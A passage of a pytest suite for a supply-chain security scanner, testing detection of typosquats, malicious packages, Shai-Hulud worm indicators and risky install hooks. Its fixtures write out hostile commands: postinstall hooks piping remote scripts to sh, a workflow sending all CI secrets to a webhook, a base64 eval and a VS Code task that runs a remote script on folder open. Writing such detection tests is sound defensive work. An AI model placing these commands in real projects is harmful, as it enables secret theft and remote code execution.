    ("node -e \"require('child_process').exec('whoami')\"", Severity.MEDIUM),
    ("node -e \"fetch('https://discord.com/api/webhooks/1/abc',{method:'POST'})\"", Severity.HIGH),
    ("wget https://example.com/file.bin -O bin/tool", Severity.MEDIUM),
    ("powershell -File setup.ps1", Severity.MEDIUM),
    ("bun x some-package", Severity.MEDIUM),
    ("bunx some-package", Severity.MEDIUM),
    ("curl -L https://github.com/trufflesecurity/trufflehog/releases/x | tar xz && ./trufflehog filesystem /", Severity.CRITICAL),
    ("node setup_bun.js", Severity.CRITICAL),
])
def test_risky_install_scripts_are_flagged_with_the_right_severity(cmd, expected):
    sev, reasons = sc.analyze_command(cmd)
    assert sev == expected and reasons


NPM_LEGIT = ["react", "react-dom", "lodash", "express", "axios", "chalk", "commander", "debug", "typescript", "webpack", "eslint",
             "prettier", "jest", "moment", "uuid", "yargs", "semver", "glob", "rimraf", "vite", "vue", "next", "esbuild",
             "rxjs", "zod", "dotenv", "mongoose", "sequelize", "socket.io", "jquery", "dayjs", "preact", "tailwindcss",
             "postcss", "body-parser", "cors", "cross-env", "nodemon", "mocha", "chai", "sinon", "lodash-es", "express-session",
             "react-router-dom", "styled-components", "ws", "pg", "mysql2", "redis", "uuid4", "ejs", "pug", "core-js",
             "tslib", "ts-node", "husky", "lint-staged", "concurrently", "bluebird", "async", "underscore", "request"]
PYPI_LEGIT = ["requests", "numpy", "pandas", "django", "flask", "fastapi", "pytest", "sqlalchemy", "scipy", "matplotlib",
              "pillow", "boto3", "urllib3", "setuptools", "cryptography", "pyyaml", "jinja2", "click", "certifi", "idna",
              "pydantic", "aiohttp", "httpx", "attrs", "cattrs", "pyaml", "scikit-learn", "torch", "tensorflow", "beautifulsoup4",
              "lxml", "psycopg2-binary", "redis", "celery", "gunicorn", "uvicorn", "black", "mypy", "pylint", "sphinx",
              "python-dateutil", "typing_extensions", "Typing-Extensions", "six", "packaging", "wheel", "pip", "tqdm", "rich"]


@pytest.mark.parametrize("name", NPM_LEGIT)
def test_popular_npm_names_are_never_flagged_as_typosquats(name):
    assert sc.typosquat_of("npm", name) is None


@pytest.mark.parametrize("name", PYPI_LEGIT)
def test_popular_pypi_names_are_never_flagged_as_typosquats(name):
    assert sc.typosquat_of("PyPI", name) is None


def test_every_name_in_the_bundled_popular_list_is_clean():
    pop = sc.popular()
    assert len(pop.npm) >= 150 and len(pop.pypi) >= 150
    for n in pop.npm_known:
        assert sc.typosquat_of("npm", n) is None, n
    for n in pop.pypi_known:
        assert sc.typosquat_of("PyPI", n) is None, n
    assert "react" in pop.npm and "requests" in pop.pypi and "lodash" in pop.npm


@pytest.mark.parametrize("eco,name,target", [
    ("npm", "expres", "express"), ("npm", "loadsh", "lodash"), ("npm", "reacct", "react"), ("npm", "axois", "axios"),
    ("npm", "crossenv", "cross-env"), ("npm", "cross_env", "cross-env"), ("npm", "lodahs", "lodash"),
    ("PyPI", "requets", "requests"), ("PyPI", "reqeusts", "requests"), ("PyPI", "numpyy", "numpy"),
    ("PyPI", "djang0", "django"), ("PyPI", "python-dateutils", "python-dateutil"), ("PyPI", "pythondateutil", "python-dateutil"),
])
def test_typosquats_of_popular_packages_are_found(eco, name, target):
    hit = sc.typosquat_of(eco, name)
    assert hit is not None and hit[0] == target, (name, hit)


def test_typosquat_scope_lookalike_and_short_names():
    assert sc.typosquat_of("npm", "@angullar/core")[0] == "@angular"
    assert sc.typosquat_of("npm", "@angular/core") is None and sc.typosquat_of("npm", "@types/node") is None
    assert sc.typosquat_of("npm", "@mycompany/utils") is None
    assert sc.typosquat_of("npm", "ab") is None and sc.typosquat_of("Go", "github.com/x/y") is None
    assert sc.typosquat_of("npm", "totally-unrelated-internal-lib") is None


def test_dl1_edit_distance():
    assert sc._dl1("lodash", "loadsh") and sc._dl1("express", "expres") and sc._dl1("react", "reacts")
    assert sc._dl1("abc", "abd") and not sc._dl1("abc", "abc") and not sc._dl1("abc", "xyz") and not sc._dl1("ab", "abcd")


def test_load_jsonc_handles_comments_and_trailing_commas():
    doc = sc.load_jsonc('// c\n{"a": [1, 2,], /* x */ "b": "http://x//y,}", }')
    assert doc == {"a": [1, 2], "b": "http://x//y,}"}
    assert sc.load_jsonc("{broken") is None


# =========================================================================== scanner: OSV findings
def osv_env(monkeypatch, hits=None, docs=None):
    fake = FakeOsv(hits=hits, docs=docs)
    monkeypatch.setattr("urllib.request.urlopen", fake)
    return fake


def test_malicious_package_is_critical_with_guidance(tmp_path, monkeypatch):
    write(tmp_path, "app/package-lock.json", lock_v3({"@ctrl/tinycolor": {"version": "4.1.1"}, "react": {"version": "18.2.0"}},
                                                      {"@ctrl/tinycolor": "^4.1.0", "react": "^18"}))
    osv_env(monkeypatch, {"npm/@ctrl/tinycolor@4.1.1": ["MAL-2025-47141"]}, {"MAL-2025-47141": MAL_DOC})
    findings, checks = run_scan(make_ctx(tmp_path))
    mal = by_rule(findings, "AEG-SC-MALPKG")
    assert len(mal) == 1 and mal[0].severity == Severity.CRITICAL
    f = mal[0]
    assert f.title == "Known malicious package npm/@ctrl/tinycolor@4.1.1 in app" and f.category == "malware"
    assert f.location.startswith(str(tmp_path / "app" / "package-lock.json"))
    assert f.evidence["advisories"] == ["MAL-2025-47141"] and f.evidence["file"].endswith("package-lock.json")
    assert "rotate" in f.recommendation.lower() and "persistence" in f.recommendation.lower()
    assert "T1195.002" in f.mitre and f.remediation is None
    assert not by_rule(findings, "AEG-SC-VULN")
    osv_check = [c for c in checks if c.check_id == "AEG-SC-OSV"][0]
    assert osv_check.status == CheckStatus.PASS


def test_the_same_vulnerable_package_in_two_projects_names_each_project(tmp_path, monkeypatch):
    """Real macOS CI: two Node installs held js-yaml@3.14.1 and the report showed the same title twice."""
    for proj in ("site", "admin-tool"):
        write(tmp_path, f"{proj}/package-lock.json", lock_v3({"lodash": {"version": "4.17.15"}}, {"lodash": "^4"}))
    docs = {"GHSA-aaaa-aaaa-aaaa": ghsa("GHSA-aaaa-aaaa-aaaa", "HIGH", fixed=("4.17.21",))}
    osv_env(monkeypatch, {"npm/lodash@4.17.15": list(docs)}, docs)
    findings, _ = run_scan(make_ctx(tmp_path))
    titles = sorted(f.title for f in by_rule(findings, "AEG-SC-VULN"))
    assert titles == ["Vulnerable npm package lodash@4.17.15 in admin-tool: 1 known advisory (high)",
                      "Vulnerable npm package lodash@4.17.15 in site: 1 known advisory (high)"]


def test_vulnerable_packages_aggregate_advisories_per_package(tmp_path, monkeypatch):
    write(tmp_path, "app/package-lock.json", lock_v3({"lodash": {"version": "4.17.15"}}, {"lodash": "^4"}))
    write(tmp_path, "app/yarn.lock", 'lodash@^4.17.15:\n  version "4.17.15"\n  resolved "https://registry.yarnpkg.com/lodash/-/lodash-4.17.15.tgz#x"\n')
    docs = {"GHSA-aaaa-aaaa-aaaa": ghsa("GHSA-aaaa-aaaa-aaaa", "HIGH", fixed=("4.17.21",)),
            "GHSA-bbbb-bbbb-bbbb": ghsa("GHSA-bbbb-bbbb-bbbb", "MODERATE", fixed=("4.17.19", "3.10.2")),
            "GHSA-cccc-cccc-cccc": ghsa("GHSA-cccc-cccc-cccc", "LOW", fixed=())}
    osv_env(monkeypatch, {"npm/lodash@4.17.15": list(docs)}, docs)
    findings, _ = run_scan(make_ctx(tmp_path))
    vulns = by_rule(findings, "AEG-SC-VULN")
    assert len(vulns) == 1  # one finding per package, even though two lockfiles list it
    f = vulns[0]
    assert f.severity == Severity.HIGH and f.category == "vulnerability" and f.evidence["advisory_count"] == 3
    assert [a["id"] for a in f.evidence["advisories"]][0] == "GHSA-aaaa-aaaa-aaaa"
    assert f.evidence["fixed_in"] == "4.17.21" and f.evidence["no_fix_listed"] == ["GHSA-cccc-cccc-cccc"]
    assert f.evidence["fixed_by_advisory"]["GHSA-bbbb-bbbb-bbbb"] == ["4.17.19", "3.10.2"]
    assert len(f.evidence["files"]) == 2 and "4.17.21" in f.recommendation and "npm install lodash@4.17.21" in f.recommendation


def test_osv_critical_is_capped_at_high_but_kept_in_evidence(tmp_path, monkeypatch):
    write(tmp_path, "svc/requirements.txt", "django==2.2.0\n")
    osv_env(monkeypatch, {"PyPI/django@2.2.0": ["GHSA-crit-crit-crit"]},
            {"GHSA-crit-crit-crit": ghsa("GHSA-crit-crit-crit", "CRITICAL", pkg=("PyPI", "Django"), fixed=("2.2.28",))})
    f = by_rule(run_scan(make_ctx(tmp_path))[0], "AEG-SC-VULN")[0]
    assert f.severity == Severity.HIGH and f.evidence["osv_severity"] == "CRITICAL" and f.evidence["fixed_in"] == "2.2.28"
    assert 'pip install --upgrade "django>=2.2.28"' in f.recommendation


@pytest.mark.parametrize("label,expected", [("LOW", Severity.LOW), ("MODERATE", Severity.MEDIUM), ("HIGH", Severity.HIGH)])
def test_vulnerability_severity_follows_osv(tmp_path, monkeypatch, label, expected):
    write(tmp_path, "svc/requirements.txt", "requests==2.19.0\n")
    osv_env(monkeypatch, {"PyPI/requests@2.19.0": ["GHSA-aaaa-aaaa-aaaa"]},
            {"GHSA-aaaa-aaaa-aaaa": ghsa("GHSA-aaaa-aaaa-aaaa", label, pkg=("PyPI", "requests"))})
    assert by_rule(run_scan(make_ctx(tmp_path))[0], "AEG-SC-VULN")[0].severity == expected


def test_withdrawn_advisories_are_ignored(tmp_path, monkeypatch):
    write(tmp_path, "svc/requirements.txt", "requests==2.19.0\n")
    doc = ghsa("GHSA-aaaa-aaaa-aaaa")
    doc["withdrawn"] = "2024-01-01T00:00:00Z"
    osv_env(monkeypatch, {"PyPI/requests@2.19.0": ["GHSA-aaaa-aaaa-aaaa"]}, {"GHSA-aaaa-aaaa-aaaa": doc})
    assert not by_rule(run_scan(make_ctx(tmp_path))[0], "AEG-SC-VULN")


def test_per_project_cap_summarises_the_rest(tmp_path, monkeypatch):
    n = sc.MAX_VULN_FINDINGS_PER_PROJECT + 10
    pkgs = {f"vuln{i:03d}": {"version": "1.0.0"} for i in range(n)}
    write(tmp_path, "big/package-lock.json", lock_v3(pkgs, {}))
    hits = {f"npm/vuln{i:03d}@1.0.0": [f"GHSA-{i:04d}-aaaa-aaaa"] for i in range(n)}
    docs = {f"GHSA-{i:04d}-aaaa-aaaa": ghsa(f"GHSA-{i:04d}-aaaa-aaaa", "HIGH" if i < 5 else "LOW", pkg=("npm", f"vuln{i:03d}"))
            for i in range(n)}
    osv_env(monkeypatch, hits, docs)
    findings, _ = run_scan(make_ctx(tmp_path))
    singles = by_rule(findings, "AEG-SC-VULN")
    more = by_rule(findings, "AEG-SC-VULN-MORE")
    assert len(singles) == sc.MAX_VULN_FINDINGS_PER_PROJECT and len(more) == 1
    assert sum(1 for f in singles if f.severity == Severity.HIGH) == 5  # the worst ones are listed individually
    assert more[0].evidence["omitted"] == 10 and more[0].evidence["by_severity"] == {"low": 10}
    assert len(more[0].evidence["packages"]) == 10 and more[0].severity == Severity.LOW


def test_distinct_packages_in_one_lockfile_have_distinct_fingerprints(tmp_path, monkeypatch):
    write(tmp_path, "app/package-lock.json", lock_v3({"a-pkg": {"version": "1.0.0"}, "b-pkg": {"version": "1.0.0"}}, {}))
    docs = {"MAL-1-aaaa": dict(MAL_DOC, id="MAL-1-aaaa"), "MAL-2-bbbb": dict(MAL_DOC, id="MAL-2-bbbb")}
    osv_env(monkeypatch, {"npm/a-pkg@1.0.0": ["MAL-1-aaaa"], "npm/b-pkg@1.0.0": ["MAL-2-bbbb"]}, docs)
    mal = by_rule(run_scan(make_ctx(tmp_path))[0], "AEG-SC-MALPKG")
    assert len(mal) == 2 and len({f.fingerprint for f in mal}) == 2


def test_offline_scan_warns_and_uses_cache(tmp_path, monkeypatch):
    write(tmp_path, "svc/requirements.txt", "requests==2.19.0\nnumpy==1.26.0\n")
    osv_env(monkeypatch, {"PyPI/requests@2.19.0": ["GHSA-aaaa-aaaa-aaaa"]},
            {"GHSA-aaaa-aaaa-aaaa": ghsa("GHSA-aaaa-aaaa-aaaa", "HIGH", pkg=("PyPI", "requests"))})
    findings, checks = run_scan(make_ctx(tmp_path))  # warm the cache while online
    assert len(by_rule(findings, "AEG-SC-VULN")) == 1
    assert [c for c in checks if c.check_id == "AEG-SC-OSV"][0].status == CheckStatus.PASS

    monkeypatch.setattr("urllib.request.urlopen", FakeOsv(fail=urllib.error.URLError("Network is unreachable")))
    findings2, checks2 = run_scan(make_ctx(tmp_path, supplychain_cache_ttl_hours=0))  # everything counts as expired -> network -> fails
    assert len(by_rule(findings2, "AEG-SC-VULN")) == 1  # still reported from the (stale) cache
    c = [c for c in checks2 if c.check_id == "AEG-SC-OSV"][0]
    assert c.status == CheckStatus.WARN and "offline - results from cache only" in c.detail


def test_supplychain_online_false_option(tmp_path, monkeypatch):
    write(tmp_path, "svc/requirements.txt", "requests==2.19.0\n")

    def forbidden(req, timeout=None):  # pragma: no cover
        raise AssertionError("network used although supplychain_online is False")

    monkeypatch.setattr("urllib.request.urlopen", forbidden)
    findings, checks = run_scan(make_ctx(tmp_path, supplychain_online=False))
    c = [c for c in checks if c.check_id == "AEG-SC-OSV"][0]
    assert c.status == CheckStatus.WARN and "offline - results from cache only" in c.detail and not by_rule(findings, "AEG-SC-VULN")


def test_no_pinned_versions_skips_the_osv_check(tmp_path):
    write(tmp_path, "svc/requirements.txt", "flask\nnumpy>=1.2\n")
    _, checks = run_scan(make_ctx(tmp_path))
    c = [c for c in checks if c.check_id == "AEG-SC-OSV"][0]
    assert c.status == CheckStatus.SKIP


def test_empty_tree_reports_skip(tmp_path):
    findings, checks = run_scan(make_ctx(tmp_path))
    assert findings == [] and [c.status for c in checks if c.check_id == "AEG-SC-PROJECTS"] == [CheckStatus.SKIP]


# =========================================================================== scanner: offline heuristics
def test_typosquat_in_package_json_and_requirements(tmp_path):
    write(tmp_path, "web/package.json", {"name": "web", "dependencies": {"expres": "^4.0.0", "react": "^18.0.0", "lodash": "^4"}})
    write(tmp_path, "svc/requirements.txt", "requets==2.0.0\nrequests>=2\nnumpy\n")
    findings, _ = run_scan(make_ctx(tmp_path, supplychain_online=False))
    typo = by_rule(findings, "AEG-SC-TYPOSQUAT")
    assert {f.evidence["package"] for f in typo} == {"expres", "requets"}
    assert all(f.severity == Severity.MEDIUM for f in typo)
    assert {f.evidence["resembles"] for f in typo} == {"express", "requests"}


def test_popular_direct_dependencies_produce_no_findings(tmp_path):
    write(tmp_path, "web/package.json", {"name": "web", "dependencies": {n: "^1.0.0" for n in NPM_LEGIT[:40] if n != "uuid4"}})
    write(tmp_path, "svc/requirements.txt", "".join(f"{n}>=1.0\n" for n in PYPI_LEGIT))
    findings, _ = run_scan(make_ctx(tmp_path, supplychain_online=False))
    assert findings == []


def test_install_scripts_of_installed_packages(tmp_path):
    root = tmp_path / "app"
    write(root, "package.json", {"name": "app", "version": "1.0.0", "dependencies": {"esbuild": "0.19.2", "evilpkg": "1.0.0", "weird-lib": "1.0.0"}})
    write(root, "package-lock.json", lock_v3({
        "esbuild": {"version": "0.19.2", "hasInstallScript": True}, "evilpkg": {"version": "1.0.0", "hasInstallScript": True},
        "weird-lib": {"version": "1.0.0", "hasInstallScript": True}, "plain": {"version": "1.0.0"}},
        {"esbuild": "0.19.2", "evilpkg": "1.0.0", "weird-lib": "1.0.0"}))
    write(root, "node_modules/esbuild/package.json", {"name": "esbuild", "version": "0.19.2", "scripts": {"postinstall": "node install.js"}})
    write(root, "node_modules/evilpkg/package.json", {"name": "evilpkg", "version": "1.0.0",
                                                      "scripts": {"postinstall": "curl -s https://203.0.113.9/p.sh | sh"}})
    write(root, "node_modules/weird-lib/package.json", {"name": "weird-lib", "version": "1.0.0",
                                                        "scripts": {"install": "node -e \"require('child_process').exec('id')\""}})
    write(root, "node_modules/plain/package.json", {"name": "plain", "version": "1.0.0", "scripts": {"postinstall": "curl evil | sh"}})
    findings, _ = run_scan(make_ctx(tmp_path, supplychain_online=False))
    hooks = by_rule(findings, "AEG-SC-INSTALLSCRIPT")
    by_pkg = {f.evidence["package"]: f for f in hooks}
    assert set(by_pkg) == {"evilpkg", "weird-lib"}  # esbuild's legit postinstall: nothing; "plain" has no install flag -> not read
    assert by_pkg["evilpkg"].severity == Severity.HIGH and by_pkg["weird-lib"].severity == Severity.MEDIUM
    assert by_pkg["evilpkg"].evidence["hook"] == "postinstall" and "curl" in by_pkg["evilpkg"].evidence["command"]


def test_trusted_popular_package_install_script_is_not_flagged_but_worm_still_is(tmp_path):
    root = tmp_path / "app"
    write(root, "package.json", {"name": "app", "dependencies": {"core-js": "3.0.0"}})
    write(root, "package-lock.json", lock_v3({"core-js": {"version": "3.0.0", "hasInstallScript": True}}, {"core-js": "3.0.0"}))
    write(root, "node_modules/core-js/package.json", {"name": "core-js", "version": "3.0.0",
                                                      "scripts": {"postinstall": "curl https://x.example/a | sh"}})
    assert by_rule(run_scan(make_ctx(tmp_path, supplychain_online=False))[0], "AEG-SC-INSTALLSCRIPT") == []
    write(root, "node_modules/core-js/package.json", {"name": "core-js", "version": "3.0.0",
                                                      "scripts": {"postinstall": "./trufflehog filesystem ~"}})
    worm = by_rule(run_scan(make_ctx(tmp_path, supplychain_online=False))[0], "AEG-SC-SHAIHULUD")
    assert len(worm) == 1 and worm[0].severity == Severity.CRITICAL


def test_projects_own_package_json_scripts_are_checked(tmp_path):
    write(tmp_path, "interview-task/package.json", {"name": "task", "scripts": {
        "postinstall": "node -e \"eval(Buffer.from('Y29uc29sZS5sb2coMSk=','base64').toString())\"",
        "prepare": "husky install", "test": "curl localhost:3000"}})
    findings, _ = run_scan(make_ctx(tmp_path, supplychain_online=False))
    hooks = by_rule(findings, "AEG-SC-INSTALLSCRIPT")
    assert len(hooks) == 1 and hooks[0].severity == Severity.HIGH and hooks[0].evidence["own_project"]
    assert hooks[0].location.endswith("package.json#scripts.postinstall")


# --------------------------------------------------------------------------- Shai-Hulud
def test_shai_hulud_workflow_by_name_and_by_content(tmp_path):
    exfil = ("on: push\njobs:\n  p:\n    runs-on: ubuntu-latest\n    steps:\n      - run: curl -d \"$CONTENTS\" "
             "https://webhook.site/bb8ca5f6-4175-45d2-b042-fc9ebb8170b7\n        env:\n          CONTENTS: ${{ toJSON(secrets) }}\n")
    write(tmp_path, "r1/.github/workflows/shai-hulud-workflow.yml", exfil)
    write(tmp_path, "r2/.github/workflows/renamed.yml", exfil)
    write(tmp_path, "r3/.github/workflows/formatter_123456789.yml", "on: push\njobs:\n  x:\n    steps:\n      - run: echo ${{ toJSON(secrets) }}\n")
    write(tmp_path, "r4/.github/workflows/discussion.yaml",
          "name: Discussion Create\non:\n  discussion:\njobs:\n  process:\n    runs-on: self-hosted\n    steps:\n"
          "      - name: Handle Discussion\n        run: echo ${{ github.event.discussion.body }}\n")
    write(tmp_path, "r5/.github/workflows/ci.yml", "on: push\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - run: npm test\n")
    write(tmp_path, "r6/.github/workflows/deploy.yml", "on: push\nenv:\n  TOKEN: ${{ secrets.TOKEN }}\njobs:\n  d:\n    runs-on: ubuntu-latest\n    steps:\n      - run: curl -d x https://example.com/hook\n")
    findings, _ = run_scan(make_ctx(tmp_path, supplychain_online=False))
    hits = {Path(f.location).parts[-4]: f for f in by_rule(findings, "AEG-SC-SHAIHULUD")}
    assert set(hits) == {"r1", "r2", "r3", "r4"}
    assert hits["r1"].severity == hits["r2"].severity == hits["r3"].severity == Severity.CRITICAL
    assert hits["r4"].severity == Severity.HIGH
    assert hits["r1"].remediation.action == "quarantine_file" and hits["r1"].remediation.params["path"].endswith("shai-hulud-workflow.yml")
    assert "T1195.002" in hits["r1"].mitre


def test_several_workflow_files_in_one_repository(tmp_path):
    wf = tmp_path / "repo" / ".github" / "workflows"
    for name in ("a-ci.yml", "z-deploy.yaml", "notes.txt"):
        write(wf, name, "on: push\njobs: {}\n")
    write(wf, "shai-hulud.yaml", "on: push\n")
    findings, _ = run_scan(make_ctx(tmp_path, supplychain_online=False))
    assert [Path(f.location).name for f in by_rule(findings, "AEG-SC-SHAIHULUD")] == ["shai-hulud.yaml"]


def test_shai_hulud_payload_hash_markers_and_layout(tmp_path, monkeypatch):
    payload = b"console.log('payload-for-test');" * 100
    digest = hashlib.sha256(payload).hexdigest()
    monkeypatch.setitem(sc.KNOWN_WORM_SHA256, digest, "Shai-Hulud test payload")
    # 1: infected project - postinstall runs bundle.js whose hash is known
    write(tmp_path, "pubpkg/package.json", {"name": "pubpkg", "version": "1.0.1", "scripts": {"postinstall": "node bundle.js"}})
    (tmp_path / "pubpkg" / "bundle.js").write_bytes(payload)
    # 2: unknown hash but worm strings inside
    write(tmp_path, "pkg2/package.json", {"name": "pkg2", "scripts": {"postinstall": "node bundle.js"}})
    (tmp_path / "pkg2" / "bundle.js").write_bytes(b"/* Shai-Hulud */ fetch('https://webhook.site/x'); trufflehog")
    # 3: Shai-Hulud 2.0 layout
    write(tmp_path, "pkg3/package.json", {"name": "pkg3", "scripts": {"preinstall": "node setup_bun.js"}})
    (tmp_path / "pkg3" / "setup_bun.js").write_bytes(b"// installs bun\n")
    (tmp_path / "pkg3" / "bun_environment.js").write_bytes(b"// payload\n")
    # 4: legitimate bundler output used by a postinstall (small, no markers) - not flagged
    write(tmp_path, "legit/package.json", {"name": "legit", "scripts": {"postinstall": "node bundle.js"}})
    (tmp_path / "legit" / "bundle.js").write_bytes(b"console.log('hello');\n" * 50)
    # 5: a bundle.js that no install hook runs and whose hash is unknown - not flagged
    write(tmp_path, "docs/package.json", {"name": "docs", "scripts": {"build": "webpack"}})
    (tmp_path / "docs" / "bundle.js").write_bytes(b"/* Shai-Hulud trufflehog webhook.site */")
    # 6: the known payload file itself is an indicator even when nothing runs it
    write(tmp_path, "stray/package.json", {"name": "stray"})
    (tmp_path / "stray" / "bundle.js").write_bytes(payload)
    findings, _ = run_scan(make_ctx(tmp_path, supplychain_online=False))
    worm = {Path(f.location).parent.name: f for f in by_rule(findings, "AEG-SC-SHAIHULUD")}
    assert set(worm) == {"pubpkg", "pkg2", "pkg3", "stray"}
    assert all(f.severity == Severity.CRITICAL for f in worm.values())
    assert worm["pubpkg"].evidence["sha256"] == digest and "matches Shai-Hulud test payload" in worm["pubpkg"].evidence["reasons"][0]
    assert worm["pubpkg"].remediation.action == "quarantine_file"


def test_known_worm_hashes_are_well_formed():
    assert len(sc.KNOWN_WORM_SHA256) == 5
    for h in sc.KNOWN_WORM_SHA256:
        assert re.fullmatch(r"[0-9a-f]{64}", h)
    assert "46faab8ab153fae6e80e7cca38eab363075bb524edd79e42269217a083628f09" in sc.KNOWN_WORM_SHA256


def test_shai_hulud_runner_backdoor_in_home(tmp_path):
    home = tmp_path / "home"
    write(home, ".dev-env/.runner", json.dumps({"agentName": "SHA1HULUD", "poolName": "Default"}))
    f = sc.check_home_iocs(home)
    assert len(f) == 1 and f[0].severity == Severity.CRITICAL and "SHA1HULUD" in f[0].description
    clean = tmp_path / "clean"
    (clean / ".dev-env").mkdir(parents=True)
    assert sc.check_home_iocs(clean) == []  # an unrelated folder of that name is not an IOC
    layout = tmp_path / "layout"
    write(layout, ".dev-env/config.sh", "#!/bin/sh\n")
    (layout / ".dev-env" / "bin").mkdir()
    assert sc.check_home_iocs(layout)[0].severity == Severity.HIGH
    assert sc.check_home_iocs(tmp_path / "nohome") == []


def test_vscode_tasks_run_on_folder_open(tmp_path):
    write(tmp_path, "evil/.vscode/tasks.json", '''// workspace tasks
{
  "version": "2.0.0",
  "tasks": [
    {
      "label": "env",
      "type": "shell",
      "osx": { "command": "curl 'https://vscode-setup.example/settings/mac?flag=1' | sh" },
      "linux": { "command": "wget -qO- 'https://vscode-setup.example/settings/linux?flag=1' | sh" },
      "windows": { "command": "curl https://vscode-setup.example/settings/windows?flag=1 | cmd" },
      "presentation": { "reveal": "never" },
      "runOptions": { "runOn": "folderOpen" },
    },
  ]
}
''')
    write(tmp_path, "fine/.vscode/tasks.json", json.dumps({"version": "2.0.0", "tasks": [
        {"label": "watch", "type": "shell", "command": "npm run watch", "runOptions": {"runOn": "folderOpen"}},
        {"label": "fetch", "type": "shell", "command": "curl https://example.com/x | sh"}]}))  # risky but not on open
    findings, _ = run_scan(make_ctx(tmp_path, supplychain_online=False))
    hits = by_rule(findings, "AEG-SC-VSCODE-TASK")
    assert len(hits) == 1 and hits[0].severity == Severity.HIGH and "evil" in hits[0].location
    assert hits[0].evidence["label"] == "env"


# =========================================================================== discovery
def test_discovery_skips_dependency_dirs_venvs_and_hidden_dirs(tmp_path):
    write(tmp_path, "proj/package-lock.json", "{}")
    write(tmp_path, "proj/node_modules/dep/package.json", "{}")
    write(tmp_path, "proj/.git/package.json", "{}")
    write(tmp_path, "proj/.hidden/requirements.txt", "evil==1.0\n")
    write(tmp_path, "py/requirements.txt", "requests==2.0.0\n")
    write(tmp_path, "py/myenv/pyvenv.cfg", "home = x")
    write(tmp_path, "py/myenv/lib/requirements.txt", "evil==1.0\n")
    write(tmp_path, "py/venv/Scripts/requirements.txt", "evil==1.0\n")
    write(tmp_path, "py/vendor/lib/composer.lock", "{}")
    disc = sc.discover([tmp_path], sc.Budget(), lambda: False)
    assert {p.name for p in disc.projects} == {"proj", "py"} and not disc.truncated


def test_discovery_depth_entry_and_time_budgets(tmp_path):
    write(tmp_path, "a/b/c/d/e/package-lock.json", "{}")
    write(tmp_path, "top/package-lock.json", "{}")
    shallow = sc.discover([tmp_path], sc.Budget(max_depth=2), lambda: False)
    assert {p.name for p in shallow.projects} == {"top"}
    deep = sc.discover([tmp_path], sc.Budget(max_depth=6), lambda: False)
    assert {p.name for p in deep.projects} == {"top", "e"}
    for i in range(30):
        write(tmp_path, f"many/dir{i}/f.txt", "x")
    tiny = sc.discover([tmp_path], sc.Budget(max_entries=10), lambda: False)
    assert tiny.truncated
    stopped = sc.discover([tmp_path], sc.Budget(), lambda: True)
    assert stopped.truncated and not stopped.projects
    capped = sc.discover([tmp_path], sc.Budget(max_projects=1), lambda: False)
    assert len(capped.projects) == 1


def test_truncated_discovery_is_reported_as_a_warning(tmp_path):
    write(tmp_path, "a/package.json", {"name": "a"})
    for i in range(20):
        write(tmp_path, f"x/{i}/f.txt", "y")
    _, checks = run_scan(make_ctx(tmp_path, supplychain_max_entries=5, supplychain_online=False))
    assert [c.status for c in checks if c.check_id == "AEG-SC-PROJECTS"] == [CheckStatus.WARN]


def test_resolve_roots_expands_fs_roots_skips_temp_and_dedupes(tmp_path, monkeypatch):
    home = tmp_path / "home"
    (home / "src").mkdir(parents=True)
    (home / "Documents" / "GitHub").mkdir(parents=True)
    (home / "Documents").mkdir(exist_ok=True)
    (home / "Music").mkdir()
    drive = tmp_path / "drive"
    (drive / "dev").mkdir(parents=True)
    (drive / "Windows").mkdir()
    explicit = tmp_path / "explicit"
    explicit.mkdir()
    tmpdir = tmp_path / "scratch"
    tmpdir.mkdir()
    monkeypatch.setattr(sc, "_temp_roots", lambda: {__import__("os").path.normcase(str(tmpdir))})
    monkeypatch.setattr(sc, "_is_fs_root", lambda p: Path(p) == drive)
    roots = sc.resolve_roots([drive, explicit, tmpdir, tmp_path / "missing"], include_defaults=True, home=home)
    names = {r.name for r in roots}
    assert {"dev", "explicit", "src", "Documents"} <= names
    assert "scratch" not in names and "Windows" not in names and "GitHub" not in names and "Music" not in names
    assert sc.resolve_roots([explicit], include_defaults=False) == [explicit]
    assert sc.resolve_roots([], include_defaults=False) == []


def test_default_roots_only_existing_dev_folders(tmp_path):
    home = tmp_path / "h"
    for n in ("source/repos", "projects", "Desktop"):
        (home / n).mkdir(parents=True)
    names = {p.name for p in sc.default_roots(home)}
    assert {"repos", "source", "projects", "Desktop"} <= names and "code" not in names


# =========================================================================== wiring and plumbing
def test_scanner_is_registered_in_load_all_and_full_profile():
    from aegis.core.engine import PROFILES

    load_all()
    assert "supplychain" in REGISTRY and "ide" in REGISTRY
    assert "supplychain" in PROFILES["full"] and "ide" in PROFILES["full"]
    inst = REGISTRY["supplychain"]()
    assert inst.name == "supplychain" and inst.supported()


def test_scanner_run_yields_findings_and_checks_for_engine(tmp_path, monkeypatch):
    write(tmp_path, "svc/requirements.txt", "requets==1.0\n")
    ctx = make_ctx(tmp_path, supplychain_online=False)
    out = list(sc.SupplyChainScanner().run(ctx))
    assert any(isinstance(i, Finding) and i.rule_id == "AEG-SC-TYPOSQUAT" for i in out)
    assert any(getattr(i, "check_id", "") == "AEG-SC-OSV" for i in out)
    assert ctx.stats["supplychain_projects"] == 1


def test_scan_project_accepts_a_single_lockfile_and_returns_findings(tmp_path, monkeypatch):
    p = write(tmp_path, "somewhere/requirements.txt", "requests==2.19.0\n")
    write(tmp_path, "somewhere/other/requirements.txt", "requests==2.19.0\n")  # must not be looked at
    osv_env(monkeypatch, {"PyPI/requests@2.19.0": ["GHSA-aaaa-aaaa-aaaa"]},
            {"GHSA-aaaa-aaaa-aaaa": ghsa("GHSA-aaaa-aaaa-aaaa", "HIGH", pkg=("PyPI", "requests"))})
    findings = sc.scan_project(p, make_ctx(tmp_path, paths=[]))
    assert len(findings) == 1 and findings[0].rule_id == "AEG-SC-VULN" and findings[0].scanner == "supplychain"
    assert sc.scan_project(tmp_path / "does-not-exist", make_ctx(tmp_path)) == []


def test_findings_are_json_serialisable_with_valid_fields(tmp_path, monkeypatch):
    write(tmp_path, "app/package.json", {"name": "app", "dependencies": {"expres": "^1", "tinycolor": "1.0.0"},
                                         "scripts": {"postinstall": "curl https://x.example/s | sh"}})
    write(tmp_path, "app/package-lock.json", lock_v3({"@ctrl/tinycolor": {"version": "4.1.1"}, "lodash": {"version": "4.17.15"}}, {}))
    docs = {"MAL-2025-47141": MAL_DOC, "GHSA-aaaa-aaaa-aaaa": ghsa("GHSA-aaaa-aaaa-aaaa")}
